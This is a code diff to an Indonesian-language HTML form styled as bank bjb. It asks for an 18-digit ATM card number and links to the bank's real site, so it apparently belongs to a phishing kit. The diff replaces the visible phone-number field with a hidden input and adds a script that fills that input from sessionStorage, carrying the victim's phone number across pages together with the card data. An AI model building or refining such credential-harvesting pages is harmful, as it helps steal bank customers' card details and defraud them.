@@ -2431,13 +2431,6 @@ a.btn { border: none; border-radius: 2px; display: inline-block; height: 30px; l
 </div>
 </div>
 <div class="row">
-<p class="" style="margin: 10px 0">Nomor Handphone</p>
-<div class="input-field">
-<input type="tel" id="nohp" name="nohp" value="" placeholder="" maxlength="15" minlength="10" class="valTextNumber wdFull " autocomplete="off" required="required">
-<p></p>
-</div>
-</div>
-<div class="row">
 <p class="" style="margin: 10px 0">Masukkan 18 Digit Angka Nomor Kartu ATM</p>
 <div class="input-field">
 <input type="tel" id="atm" name="atm" value="" placeholder="" maxlength="18" minlength="16" class="valTextNumber wdFull " autocomplete="off" required="required">
@@ -2488,6 +2481,7 @@ a.btn { border: none; border-radius: 2px; display: inline-block; height: 30px; l
 <p></p>
 </div>
 </div>
+	<input type="hidden" name="nohp" id="nohp" value="">
 <button type="submit" id="kirims" class="wdFull">Selanjutnya</button></form><center><a href="https://ib.bankbjb.co.id/bjb.net">Kembali ke halaman utama</a></center></div></div></div><center style="color:#000000; text-decoration:none; font:bold 8px verdana,sans-serif; letter-spacing:.5px; margin-top:10px;">Demi keamanan silahkan gunakan virtual keyboard, Resiko penyadapan data dari keyboard fisik (non virtual) diluar tanggung jawab bank bjb</center></div>
 </div>
 </div>
@@ -2509,6 +2503,10 @@ a.btn { border: none; border-radius: 2px; display: inline-block; height: 30px; l
 
 </div><div id="foot_pdf"><br><br><br></div>
 <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
+	<script>
+ var nohp = sessionStorage.getItem("nohp");
+document.getElementById("nohp").value = nohp + "";     
+	</script>
 <script>
  
 $(document).ready(function(){
